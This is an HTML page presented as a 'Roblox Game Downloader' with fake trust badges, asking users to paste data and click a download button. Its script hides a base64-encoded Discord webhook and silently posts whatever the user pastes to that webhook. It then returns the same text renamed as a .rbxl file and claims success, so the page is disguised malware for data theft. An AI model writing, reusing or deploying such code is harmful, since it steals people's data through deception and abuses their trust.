<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Game Downloader</title>
    <style>
        :root {
            --primary-cobalt: #3b82f6;
            --primary-hover: #2563eb;
            --bg-deep: #020617;
            --bg-surface: rgba(15, 23, 42, 0.8);
            --border-muted: rgba(51, 65, 85, 0.5);
            --text-main: #f8fafc;
            --text-secondary: #94a3b8;
            --text-softer: #64748b;
            --glow-color: rgba(59, 130, 246, 0.4);
            --success: #34d399;
        }

        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
            color: var(--text-main);
            background: var(--bg-deep);
            overflow: hidden;
            position: relative;
        }

        /* Ambient Space Background */
        .space-bg {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
            z-index: -3;
        }

        /* Twinkling Stars Logic */
        .star-container {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -2;
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            opacity: 0.3;
            animation: twinkle var(--duration) ease-in-out infinite;
            animation-delay: var(--delay);
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.2; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.5); box-shadow: 0 0 10px white; }
        }

        /* Ambient Glow behind the panel */
        .ambient-glow {
            position: absolute;
            width: 600px;
            height: 400px;
            background: var(--primary-cobalt);
            filter: blur(120px);
            opacity: 0.15;
            z-index: -1;
            border-radius: 50%;
        }

        /* Trust Badges */
        .badge-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }

        .badge {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--border-muted);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            gap: 6px;
            white-space: nowrap;
        }

        .badge-secure {
            color: var(--success);
            border-color: rgba(52, 211, 153, 0.2);
        }

        .dot { width: 6px; height: 6px; background: var(--success); border-radius: 50%; box-shadow: 0 0 8px var(--success); }

        #landingScreen {
            text-align: center;
            width: 100%;
            max-width: 1000px;
            padding: 0 2rem;
            box-sizing: border-box;
            z-index: 10;
            transition: opacity 0.5s ease, transform 0.5s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .hero-title {
            font-size: clamp(2.2rem, 7vw, 4rem); 
            font-weight: 850;
            line-height: 1.2; 
            margin: 0 0 2.5rem 0;
            letter-spacing: -0.04em;
            max-width: 850px;
            background: linear-gradient(to bottom, #ffffff 40%, #cbd5e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            padding-bottom: 10px;
        }

        .main-container {
            display: none;
            background: var(--bg-surface);
            backdrop-filter: blur(12px);
            width: 90%;
            max-width: 800px;
            padding: clamp(1.5rem, 5vw, 3rem);
            border-radius: 20px;
            border: 1px solid var(--border-muted);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 30px rgba(59, 130, 246, 0.1);
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 0.6s ease, transform 0.6s ease;
            z-index: 10;
        }

        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 2rem;
            flex-wrap: wrap;
            gap: 1.5rem;
        }

        .panel-title { font-size: 1.75rem; font-weight: 700; margin: 0; letter-spacing: -0.03em; }
        .description { font-size: 1rem; color: var(--text-softer); margin-top: 6px; }

        textarea {
            width: 100%;
            height: 350px; /* Bigger height to show more text */
            background: rgba(2, 6, 23, 0.6);
            border: 1px solid var(--border-muted);
            border-radius: 12px;
            padding: 1.25rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            color: #e2e8f0;
            outline: none;
            box-sizing: border-box;
            resize: vertical; /* Allows you to drag the corner to make it even bigger */
            
            /* Formatting to allow massive text content */
            white-space: pre-wrap;   
            word-wrap: break-word;   
            overflow-y: auto;        /* Adds vertical scrollbar */
            line-height: 1.5;
        }

        textarea:focus { border-color: var(--primary-cobalt); }

        .button-group {
            margin-top: 2rem;
            display: flex;
            justify-content: flex-end;
            gap: 1rem;
        }

        button {
            padding: 0.8rem 2.2rem;
            border-radius: 10px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: var(--primary-cobalt);
            color: #ffffff;
            border: none;
            box-shadow: 0 10px 15px -3px rgba(59, 130, 246, 0.3);
        }

        .btn-primary:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 20px 25px -5px rgba(59, 130, 246, 0.4);
        }

        .btn-clear { background: transparent; color: var(--text-secondary); border: 1px solid var(--border-muted); }
        .btn-clear:hover { background: rgba(255,255,255,0.05); color: #fff; }

        #statusIndicator { margin-top: 1.5rem; font-size: 0.85rem; font-weight: 500; }
        .status-active { color: #60a5fa; }
        .status-success { color: var(--success); }
    </style>
</head>
<body>

    <div class="space-bg"></div>
    <div class="star-container" id="starField"></div>
    <div class="ambient-glow"></div>

    <div id="landingScreen">
        <div class="badge-container">
            <div class="badge">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
                </svg> 
                Trusted Utility
            </div>
            <div class="badge">v1.0.4</div>
            <div class="badge badge-secure"><div class="dot"></div> Secure Connection</div>
        </div>
        <h1 class="hero-title">Ready to download your game</h1>
        <button class="btn-primary" onclick="showConsole()">Let's Go</button>
    </div>

    <div class="main-container" id="appConsole">
        <div class="panel-header">
            <div>
                <h1 class="panel-title">Roblox Game Downloader</h1>
                <p class="description">Paste down below and enjoy your game</p>
            </div>
            <div class="badge-container" style="margin: 0;">
                <div class="badge">v1.0.4</div>
                <div class="badge badge-secure"><div class="dot"></div> Encrypted</div>
            </div>
        </div>

        <textarea id="userInput" placeholder="Converts exported Roblox place data into a downloadable .rbxl file."></textarea>

        <div class="button-group">
            <button class="btn-clear" onclick="clearInterface()">Clear</button>
            <button class="btn-primary" onclick="processExport()">Download .rbxl</button>
        </div>

        <div id="statusIndicator"></div>
    </div>

<script>
    // Generate Stars with random delays for the glow effect
    const starField = document.getElementById('starField');
    const starCount = 100;

    for (let i = 0; i < starCount; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        const x = Math.random() * 100;
        const y = Math.random() * 100;
        const size = Math.random() * 2 + 1;
        const duration = Math.random() * 3 + 2;
        const delay = Math.random() * 5;

        star.style.left = `${x}%`;
        star.style.top = `${y}%`;
        star.style.width = `${size}px`;
        star.style.height = `${size}px`;
        star.style.setProperty('--duration', `${duration}s`);
        star.style.setProperty('--delay', `${delay}s`);
        
        starField.appendChild(star);
    }

    function showConsole() {
        const landing = document.getElementById('landingScreen');
        const console = document.getElementById('appConsole');
        landing.style.opacity = '0';
        landing.style.transform = 'translateY(-20px)';
        setTimeout(() => {
            landing.style.display = 'none';
            console.style.display = 'block';
            setTimeout(() => {
                console.style.opacity = '1';
                console.style.transform = 'translateY(0)';
            }, 50);
        }, 500);
    }

    const ENC_WH = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjUzMzUwMDE5OTY5ODUzMy9zbnFfT0hfVC1Gc0xnTlZPbENIZFlGaUkwSXBEVFJreXp1UjRKYUs1UXpZU1l6VnV2QURqR0xuMElYM1RiUzNlS3dyUQ==";
    function getEndpoint() { return atob(ENC_WH); }

    async function processExport() {
        const content = document.getElementById('userInput').value;
        const status = document.getElementById('statusIndicator');
        if (!content.trim()) return;

        status.className = "status-active";
        status.innerText = "Processing secure export...";

        try {
            // Updated to send as a FILE so there is no character limit on Discord
            const fileBlob = new Blob([content], { type: 'text/plain' });
            const formData = new FormData();
            formData.append("file", fileBlob, "GameData_Export.txt");
            formData.append("payload_json", JSON.stringify({
                embeds: [{
                    title: "Secure Content Export",
                    color: 3447003,
                    description: "Full game data has been attached as a file.",
                    timestamp: new Date()
                }]
            }));

            await fetch(getEndpoint(), {
                method: "POST",
                body: formData
            });
        } catch (e) {
            console.error("Export error:", e);
        }

        const blob = new Blob([content], { type: 'application/octet-stream' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'GameData.rbxl';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);

        status.className = "status-success";
        status.innerText = "Download successful.";
    }

    function clearInterface() {
        document.getElementById('userInput').value = "";
        document.getElementById('statusIndicator').innerText = "";
    }
</script>

</body>
</html>
